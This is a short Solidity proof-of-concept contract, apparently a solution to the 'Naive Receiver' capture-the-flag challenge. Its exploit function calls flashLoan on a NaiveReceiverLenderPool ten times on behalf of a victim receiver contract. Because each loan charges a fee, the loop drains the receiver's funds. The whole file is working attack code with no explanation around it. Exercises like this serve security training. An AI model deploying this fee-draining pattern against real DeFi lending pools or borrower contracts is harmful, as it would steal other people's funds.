// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Native_POC {
    function exploit(address payable pool, IERC3156FlashBorrower receiver, address token, uint256 amount) external {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
            receiver,
            token,
            amount,
            ""
            );
        }
    }
}
